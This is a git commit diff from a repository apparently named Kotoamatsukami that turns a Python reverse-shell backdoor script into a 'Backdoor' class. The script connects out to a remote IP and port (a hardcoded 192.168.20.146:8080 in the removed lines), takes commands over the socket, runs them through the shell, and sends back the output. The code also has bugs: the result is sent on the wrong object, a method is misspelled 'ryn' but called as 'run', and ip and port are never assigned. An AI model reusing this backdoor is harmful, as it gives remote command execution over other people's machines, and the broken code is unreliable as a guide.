0d6f324fde421df334d614e5aa9e324ff84b4415
RockBlet <belyakove31@gmail.com>
2022-12-23 06:41:57 +0300

    Backdoor class

--- Kotoamatsukami/backdoor.py
+++ Kotoamatsukami/backdoor.py
@@ -2,24 +2,34 @@ import socket
 import subprocess
 
 
-def execute_system_command(command):
-    return subprocess.check_output(command, shell=True)
+class Backdoor:
+    def __init__(self, ip, port):
+        self.port = port
+        self.ip = ip
+
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        self.connection.connect((self.ip, self.port))
+
+    def execute_system_command(self, command):
+        return subprocess.check_output(command, shell=True)
+
+    def ryn(self):
+        try:
+            while True:
+                command = self.connection.recv(1024)     # listen port and waiting command
+                command_result = self.execute_system_command(command)
+                command.send(command_result)
+                self.connection.send("\n [+] Connetction esteblished")
+
+        except KeyboardInterrupt:
+            self.connection.close()
 
 
 if __name__ == "__main__":
+    ip: str
+    port: int
 
-    ip = "192.168.20.146"
-    port = 8080
-
-    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    connection.connect((ip, port))
-
-    connection.send("\n [+] Connetction esteblished")
-
-    while True:
-        command = connection.recv(1024)     # listen port and waiting command
-        command_result = execute_system_command(command)
-        command.send(command_result)
-
-    connection.close()
+    backdoor = Backdoor(ip, port)
+    backdoor.run( )
 
